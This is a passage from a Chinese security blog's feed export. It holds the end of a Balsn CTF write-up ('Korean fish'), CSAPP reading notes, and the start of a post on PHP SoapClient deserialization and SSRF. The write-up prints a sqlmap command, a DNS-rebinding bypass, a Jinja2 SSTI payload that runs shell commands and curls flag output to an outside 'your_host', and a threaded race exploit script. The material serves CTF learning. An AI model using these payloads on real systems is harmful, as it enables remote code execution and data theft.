       <span class="string">'Σ&gt;―(#°ω°#)♡→'</span> : t</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"123"</span>&#125;,</span><br><span class="line">            headers = &#123;<span class="string">"X"</span>: x&#125;,</span><br><span class="line">            timeout = <span class="number">1.5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">python sqlmap.py -u "http://localhost:5000/?username=*" --technique=T --dbms=mysql --dbs  --level 1 --time-sec=2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="韩国鱼"><a href="#韩国鱼" class="headerlink" title="韩国鱼"></a>韩国鱼</h2><blockquote><p>DNS rebinding、SSTI、命令执行</p></blockquote><p>题目直接放出了 docker 环境，有个 readflag.c，看来是要执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span class="string">'🇰🇷🐟'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('發大財!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外内网里还跑了一个 flask，这段代码明显有 SSTI。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure><p>代码里还很贴心的加入了一个 <code>sleep(1)</code>，对访问 IP 的限制显然可以通过 DNS rebinding 进行绕过。当服务端通过 <code>dns_get_record</code> 解析时，返回 <code>54.87.54.87</code>，通过 <code>file_get_contents</code> 访问时，host 被解析成 <code>127.0.0.1</code> 自然就能打到内网。</p><p>国内能买到的域名 TTL 基本无法为零，难道需要充钱买新域名吗？</p><p>不，有很多现成的平台能用，比如 <a href="https://lock.cmpxchg8b.com/rebinder.html。" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html。</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wshvl45cj211k06b74t.jpg" alt="image.png"></p><p>不过这个是规律性的随机解析，还是要点小运气的 ：）</p><p>可看到成功进入内网：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wsuzjn1yj20v80bpt9z.jpg" alt="image.png"></p><p>要想访问 <code>/error_page</code> ，这还有点小限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br></pre></td></tr></table></figure><p>不过在 Flask 里有个特性，<code>//korea/error_page</code> =&gt; <code>/error_page</code>，自然就解决了。当然也可以自己写个跳转。</p><p>另外还有一点：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import os</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; os.path.join(<span class="string">"/var/www/flask"</span>, <span class="string">"error"</span>, <span class="string">"/etc/passwd"</span>)</span><br><span class="line"><span class="string">'/etc/passwd'</span></span><br></pre></td></tr></table></figure><p>接下来要做的就是找到一个可控的文件，别忘了前面还跑了个 PHP，那就利用 <code>session.upload_progress</code> 进行上传吧，也是常见的手段。可参考：</p><p><a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html" target="_blank" rel="noopener">https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html</a></p><p><a href="https://www.anquanke.com/post/id/162656" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162656</a></p><p><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=718</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p><p>我们先看一下 SSTI 如何构造才能进行命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">过滤 &#123;&#123;  =&gt;  &#123;%%&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤  .  =&gt; </span></span><br><span class="line"><span class="string">            &#123;&#123;''['__class__']&#125;&#125;</span></span><br><span class="line"><span class="string">            &#123;&#123;''|attr('__class__')&#125;&#125;</span></span><br><span class="line"><span class="string">            \x2e</span></span><br><span class="line"><span class="string">            getattr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用 payload</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">      &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">        &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [][<span class="string">'__class__'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c[<span class="string">'__name__'</span>] == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">        &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c[<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'values'</span>]() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> b[<span class="string">'__class__'</span>]==&#123;&#125;[<span class="string">'__class__'</span>] %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b[<span class="string">'keys'</span>]() %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> b[<span class="string">'eval'</span>](<span class="string">'getattr(__import__("os"),"popen")("curl your_host/`/readflag`")'</span>) %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>把 orange 之前 one line php 的 exp 改下就能用了，最终 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish.balsnctf.com'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">    &#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">        &#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">            &#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if b['eval']('getattr(__import__("os"),"popen")("curl your_host/`/readflag`")') %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Warm-up&quot;&gt;&lt;a href=&quot;#Warm-up&quot; class=&quot;headerlink&quot; title=&quot;Warm up&quot;&gt;&lt;/a&gt;Warm up&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;常见绕过、gopher 打 MySQL、SSRF&lt;/p&gt;
&lt;/blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 信息的表示和处理 笔记</title>
    <link href="https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/"/>
    <id>https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/</id>
    <published>2019-09-08T15:33:45.000Z</published>
    <updated>2019-10-11T14:32:14.122Z</updated>
    
    <content type="html"><![CDATA[<p>信息的表示是信息处理的基础。</p><p>计算机存储和处理的信息都是以二进制的形式表示，这与底层的物理结构有关。</p><blockquote><p>单个的位不是非常有用，然而，当把位组合在一起，再加上某种<em>解释</em>，即赋予不同的可能位模式以含义，我们就能够表示任何有限集合的元素。</p></blockquote><p>进一步的问题就是编码和解码，比如数据与文字该如何表示？</p><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><p>大多数计算机使用 8 位的块，作为最小的可寻址的内存单位（字节），而不是访问内存中单独的位。机械级程序将内存视为一个非常大的字节数组，称为虚拟内存。内存的每个字节都由一个唯一的数字来标识，该数字被称为<strong>地址</strong>，所有可能地址的集合称为<strong>虚拟地址空间</strong>。</p><p>十六进制表示，记一下 A、C、F 对应的十进制就好了。</p><blockquote><p>每当想起这些简单的算数、逻辑运算撑起了复杂抽象的信息处理，就不免感慨其神奇，万丈高楼平地起。</p></blockquote><h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><p>这些数值表示及其运算在学组原时就整理过好几遍了，没细看，回头想起再补充吧。</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;信息的表示是信息处理的基础。&lt;/p&gt;
&lt;p&gt;计算机存储和处理的信息都是以二进制的形式表示，这与底层的物理结构有关。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;单个的位不是非常有用，然而，当把位组合在一起，再加上某种&lt;em&gt;解释&lt;/em&gt;，即赋予不同的可能位模式以含义，我们就能
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 计算机系统漫游 笔记</title>
    <link href="https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/"/>
    <id>https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/</id>
    <published>2019-09-01T09:08:23.000Z</published>
    <updated>2019-12-19T06:28:44.833Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我听到的我会忘记</p><p>我看到的我能记住</p><p>只有我做过的，我才能理解</p></blockquote><p>CSAPP 最大的魅力在于，每章的前言会站在程序员的角度跟你分析，为什么要学这些知识，然后在正文里清晰的阐述这些问题的答案。</p><p><strong>操作系统是什么？提供了什么功能？</strong></p><ul><li><p>用户角度：操作系统是一个控制软件</p><ul><li>管理应用程序</li><li>为应用程序提供公共服务（比如底层的 IO、以及网络协议栈等各种底层 API）</li><li>进程管理</li></ul></li><li><p>硬件角度：资源管理</p><ul><li>管理外设、分配资源<ul><li>CPU 调度器</li><li>物理内存管理</li><li>虚拟内存管理</li><li>文件系统管理</li><li>中断处理与设备驱动</li></ul></li></ul></li><li><p>所处位置：硬件之上，应用程序之下</p></li><li><p>操作系统内核特征</p><ul><li>并发（注意区分并发与并行，并发强调的是一段时间，并行是一个时间点，所以并行必须是多核）</li><li>共享：<ul><li>“同时”访问</li><li>互斥共享</li></ul></li><li>虚拟（为上层提供底层的抽象）</li><li>异步</li></ul></li><li><p>内核时被信任的第三方</p></li><li><p>只有内核可以执行特权指令</p></li></ul><p>操作系统实验：</p><ul><li>系统启动及中断</li><li>物理内存管理</li><li>虚拟内存管理</li><li>内核线程管理</li><li>用户进程管理</li><li>CPU 调度</li><li>同步与互斥</li><li>文件系统</li></ul><h2 id="信息-位-上下文"><a href="#信息-位-上下文" class="headerlink" title="信息 = 位 + 上下文"></a>信息 = 位 + 上下文</h2><p>编码是一切信息处理的基础。</p><h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p><strong>编译过程：</strong></p><p>源程序（hello.c）=&gt; 预处理器 （hello.i） =&gt;  编译器（hello.s）  =&gt;  汇编器（hello.o）  =&gt;  链接器（可执行）</p><ul><li>预处理：以 # 开头的，直接修改源程序。比如 #include &lt;stdio.h&gt;，将直接把文件插入进来。</li><li>编译器：将此文本文件翻译成汇编语句。</li><li>汇编器：将汇编语句翻译成机器语言指令。</li><li>链接器：将用到的链接库合并。</li></ul><h2 id="了解编译系统如何工作大有益处"><a href="#了解编译系统如何工作大有益处" class="headerlink" title="了解编译系统如何工作大有益处"></a>了解编译系统如何工作大有益处</h2><ul><li>优化程序性能</li><li>理解链接时出现的错误</li><li>避免安全漏洞</li></ul><h2 id="处理器读并解释储存在内存中的指令"><a href="#处理器读并解释储存在内存中的指令" class="headerlink" title="处理器读并解释储存在内存中的指令"></a>处理器读并解释储存在内存中的指令</h2><h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><p>计算机：</p><ul><li>以硬件为基础</li><li>以软件扩充其功能</li><li>以执行程序的方式提现功能</li></ul><p>组成：</p><ul><li>总线：bus，各部件信息传输的渠道</li><li>I/O 设备：输入输出设备。输入信息  =&gt;  处理信息  =&gt;  输出信息</li><li>主存</li><li>处理器</li></ul><h3 id="运行-hello-程序"><a href="#运行-hello-程序" class="headerlink" title="运行 hello 程序"></a>运行 hello 程序</h3><h2 id="高速缓存至关重要"><a href="#高速缓存至关重要" class="headerlink" title="高速缓存至关重要"></a>高速缓存至关重要</h2><h2 id="存储设备形成层次结构"><a href="#存储设备形成层次结构" class="headerlink" title="存储设备形成层次结构"></a>存储设备形成层次结构</h2><h2 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>一个进程可以由多个线程构成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>为每个进程提供了一个假象，就好像每个进程都独占了主存。</p><p>每个程序执行时，内存起点都是一样的。</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h2 id="系统之间利用网络通信"><a href="#系统之间利用网络通信" class="headerlink" title="系统之间利用网络通信"></a>系统之间利用网络通信</h2><h2 id="Amdahl-定律"><a href="#Amdahl-定律" class="headerlink" title="Amdahl 定律"></a>Amdahl 定律</h2><h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><h2 id="抽象的重要性"><a href="#抽象的重要性" class="headerlink" title="抽象的重要性"></a>抽象的重要性</h2><p>CPU =&gt; 进程</p><p>磁盘 =&gt; 文件</p><p>内存 =&gt; 地址空间</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;我听到的我会忘记&lt;/p&gt;
&lt;p&gt;我看到的我能记住&lt;/p&gt;
&lt;p&gt;只有我做过的，我才能理解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CSAPP 最大的魅力在于，每章的前言会站在程序员的角度跟你分析，为什么要学这些知识，然后在正文里清晰的阐述这些问题
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>当 PHP 反序列化遇上 SSRF</title>
    <link href="https://wywwzjj.top/2019/08/20/%E5%BD%93PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%81%87%E4%B8%8ASSRF/"/>
    <id>https://wywwzjj.top/2019/08/20/当PHP反序列化遇上SSRF/</id>
    <published>2019-08-20T06:08:23.000Z</published>
    <updated>2019-11-04T02:25:43.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SOAP-简介"><a href="#SOAP-简介" class="headerlink" title="SOAP 简介"></a>SOAP 简介</h2><p>SOAP（Simple Object Access Protocol）是一种在 web service 通信时所用的基于 xml 的协议。</p><p>远在天边，近在眼前，通过这种协议可以实现“本地”调用的效果。</p><p><strong>简单实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// soapServer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> date(<span class="string">'Y-m-d'</span>, time());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$soap = <span class="keyword">new</span> SoapServer(<span class="keyword">null</span>,</span><br><span class="line">                      [<span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// namespace of the SOAP service</span></span><br><span class="line">                      );</span><br><span class="line">$soap-&gt;addFunction(<span class="string">'getTime'</span>);</span><br><span class="line">$soap-&gt;handle();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// soapClient</span></span><br><span class="line">$client = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,</span><br><span class="line">                        [<span class="string">'location'</span> =&gt; <span class="string">'http://example.com'</span>,  <span class="comment">// 服务端 URL</span></span><br><span class="line">                         <span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// 需要与服务端一致（只发起请求可以随意填）</span></span><br><span class="line">                        );</span><br><span class="line"><span class="keyword">echo</span> $client-&gt;getTime();  <span class="comment">// 得到服务端所返回的时间</span></span><br><span class="line"><span class="comment">// 这里非常重要，是反序列化到 SSRF 的核心（实际操作可调用任意方法）</span></span><br><span class="line"><span class="comment">// 这里调用了未定义的方法将唤起 __call 魔术方法，从而向 server 端发起一个请求，实现 SSRF 的效果</span></span><br></pre></td></tr></table></figure><p>还有一个很重要的利用点，CRLF 头注入，一个在 user_agent，一个在 uri，可惜的是这种方式只支持 http 协议。</p><p>下面来看一看具体的数据包：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y507mxzpj20lf07bt95.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y4o21s5fj20la08qt97.jpg" alt></p><p>不熟悉 CRLF 头注入利用方法的可以参考一下这篇文章，<a href="https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html" target="_blank" rel="noopener">Trying to hack Redis via HTTP requests</a></p><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><h3 id="2018-LCTF-babyphp’s-revenge"><a href="#2018-LCTF-babyphp’s-revenge" class="headerlink" title="2018 LCTF babyphp’s revenge"></a>2018 LCTF babyphp’s revenge</h3><blockquote><p>hint：反序列化</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 